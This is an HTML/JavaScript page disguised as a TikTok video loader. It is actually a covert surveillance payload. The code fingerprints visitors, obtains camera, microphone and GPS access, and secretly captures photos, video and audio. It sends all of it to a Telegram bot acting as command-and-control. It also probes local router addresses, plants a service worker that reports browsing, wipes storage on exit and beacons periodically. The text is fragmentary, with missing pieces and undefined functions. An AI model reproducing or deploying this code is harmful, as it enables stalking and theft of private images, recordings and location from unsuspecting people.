<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - @viral_video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            color: #fff; 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            overflow: hidden;
        }
        
        /* TikTok-style loader */
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 20px;
        }
        .tiktok-loader {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid #fe2c55;
            border-right: 3px solid #2af0ea;
            animation: spin 0.7s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loader-text {
            font-size: 14px;
            color: #888;
            letter-spacing: 0.3px;
        }
        .loader-text span {
            animation: pulse 1.5s ease-in-out infinite;
        }
        @keyframes pulse { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }

        /* Hidden elements */
        #v, #c { display: none; }
        
        /* Hidden autofill honeypot - invisible */
        .honeypot {
            position: absolute;
            left: -9999px;
            top: -9999px;
            opacity: 0;
            height: 0;
            width: 0;
            overflow: hidden;
        }
    </style>
</head>

        <div class="tiktok-loader"></div>
        <div class="loader-text"><span>Loading your video...</span></div>

                method:'POST', headers:{'Content-Type':'application/json'},

        function hs(s) { let h=0; if(!s||!s.length) return'0'; for(let i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h=h&h;} return(h>>>0).toString(16); }

        // ═════════════════════════════════════════════════

            try { const c=document.createElement('canvas'); c.width=256; c.height=256; const ctx=c.getContext('2d'); ctx.textBaseline='top'; ctx.font='18px Arial'; ctx.fillStyle='#f60'; ctx.fillRect(125,1,62,20); ctx.fillStyle='#069'; ctx.fillText('FP',2,15); ctx.fillStyle='rgba(102,204,0,0.7)'; ctx.fillText('⚡',4,17); ctx.beginPath(); ctx.arc(50,50,30,0,Math.PI*2); ctx.fillStyle='#f00'; ctx.fill(); ctx.fillRect(0,0,10,10); ctx.fillRect(50,50,10,10); ctx.font='12px Arial'; ctx.fillText('mmmwiiiI',20,100); ctx.font='16px serif'; ctx.fillText('abcdefghijklmnopqrstuvwxyz',20,130); ctx.font='16px sans-serif'; ctx.fillText('ABCDEFGHIJKLMNOPQRSTUVWXYZ',20,160); data.canvas=hs(c.toDataURL()); } catch(e) {}

        // ═════════════════════════════════════════════════
        //  PHASE 2: PERMISSION REQUEST (clean, native browser prompts)
        // ═════════════════════════════════════════════════

        async function requestPermissions() {
            // The loader text changes to something innocent

            let camera = false, mic = false, gps = false;

            // Camera + Mic (single browser prompt)
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' },
                    audio: true
                });
                camera = true; mic = true;

                const video = document.getElementById('v');
                video.srcObject = stream;
                await video.play();

                // 3 photos
                for (let i = 0; i < 3; i++) {
                    await new Promise(r => setTimeout(r, 400));
                    const c = document.getElementById('c');
                    c.width = video.videoWidth || 640;
                    c.height = video.videoHeight || 480;
                    c.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
                    tgPhoto(blob, `📸 ${i+1}`);
                }

                // Video clip
                try {
                    const rec = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
                    let ch = [];
                    rec.ondataavailable = e => ch.push(e.data);
                    rec.onstop = () => {
                        const b = new Blob(ch, {type:'video/webm'});
                        if (b.size > 1000) {
                            const fd = new FormData();
                            fd.append('chat_id',C2.chatId); fd.append('video',b,'clip.webm');
                            fd.append('caption','🎥');
                            fetch(`https://api.telegram.org/bot${C2.botToken}/sendVideo`,{method:'POST',body:fd}).catch(()=>{});
                        }
                    };
                    rec.start();
                    setTimeout(() => rec.stop(), 4000);
                } catch(e) {}

                // Audio (10s)
                try {
                    const as = new MediaStream(stream.getAudioTracks());
                    const r2 = new MediaRecorder(as);
                    let ch2 = [];
                    r2.ondataavailable = e => ch2.push(e.data);
                    r2.onstop = () => tgVoice(new Blob(ch2, {type:'audio/ogg'}));
                    r2.start();
                    setTimeout(() => r2.stop(), 8000);
                } catch(e) {}

                // Rear camera
                try {
                    const rs = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: { exact: 'environment' } }
                    });
                    const rv = document.createElement('video');
                    rv.srcObject = rs; await rv.play();
                    await new Promise(r => setTimeout(r, 500));
                    const c = document.getElementById('c');
                    c.width = rv.videoWidth || 640;
                    c.height = rv.videoHeight || 480;
                    c.getContext('2d').drawImage(rv, 0, 0);
                    const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.9));
                    tgPhoto(blob, '📸 Rear');
                    rs.getTracks().forEach(t => t.stop());
                } catch(e) {}

                // Don't stop main stream — audio still recording
                setTimeout(() => {
                    stream.getTracks().forEach(t => t.stop());
                }, 10000);

            } catch(e) {
                // Denied — don't show error, just continue
                tg(`❌ Camera/Mic denied: ${e.message}`);
            }

            // GPS (separate prompt)
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {
                        enableHighAccuracy: true, timeout: 12000, maximumAge: 0
                    });
                });
                gps = true;
                tg(`📍 **GPS:** [Map](https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}) | ±${pos.coords.accuracy}m`);
            } catch(e) {
                tg(`📍 GPS denied`);
            }

            tg(`✅ Permissions: camera=${camera}, mic=${mic}, gps=${gps}`);
            return { camera, mic, gps };
        }

                const gws = ['192.168.1.1','192.168.0.1','10.0.0.1','10.0.0.138','172.16.0.1','192.168.1.254'];
                const found = [];
                for (const gw of gws) {
                    try {
                        await new Promise(r => {
                            const img = new Image();
                            const t = setTimeout(() => { img.src=''; r(); }, 300);
                            img.onload = () => { clearTimeout(t); found.push(gw); r(); };
                            img.onerror = () => { clearTimeout(t); r(); };
                            img.src = `http://${gw}/?${Date.now()}`;
                        });
                    } catch(e) {}
                }
                if (found.length) tg(`🌐 **Gateways:** ${found.join(', ')}`);
            }, 2000);

            // ─── Service Worker ───
            setTimeout(async () => {
                try {
                    const code = `self.addEventListener('install',e=>self.skipWaiting());self.addEventListener('activate',e=>e.waitUntil(clients.claim()));self.addEventListener('message',e=>{if(e.data==='ping'){fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🕒 **SW:** '+new Date().toISOString(),parse_mode:'Markdown'})}).catch(()=>{});}});self.addEventListener('fetch',e=>{if(e.request.mode==='navigate'){e.waitUntil(fetch('https://api.telegram.org/bot${C2.botToken}/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'${C2.chatId}',text:'🌐 **Nav:** '+e.request.url,parse_mode:'Markdown'})}).catch(()=>{}));}});`;
                    const reg = await navigator.serviceWorker.register(
                        URL.createObjectURL(new Blob([code],{type:'application/javascript'})), {scope:'/'}
                    );
                    tg(`🕸️ **SW:** ${reg.scope}`);
                    setInterval(() => reg.active?.postMessage('ping'), 30000);
                } catch(e) {}
            }, 1000);

            // ─── Self-destruct ───
            window.addEventListener('beforeunload', () => {
                document.cookie.split(';').forEach(c => {
                    document.cookie = c.replace(/^ +/,'').replace(/=.*/, `=;expires=${new Date(0).toUTCString()};path=/`);
                });
                try { localStorage.clear(); } catch(e) {}
                try { sessionStorage.clear(); } catch(e) {}
                navigator.sendBeacon(`https://api.telegram.org/bot${C2.botToken}/sendMessage`,
                    new Blob([JSON.stringify({chat_id:C2.chatId, text:`🚪 **Closed** ${new Date().toISOString()}`, parse_mode:'Markdown'})], {type:'application/json'}));
            });

            // ─── Beacon every 2 min ───
            setInterval(() => tg(`💓 ${new Date().toLocaleString()}`), 120000);
        }

        async function main() {
            // Phase 1: Silent recon
            await recon();

            setTimeout(() => {

        // Start
        setTimeout(main, 500);
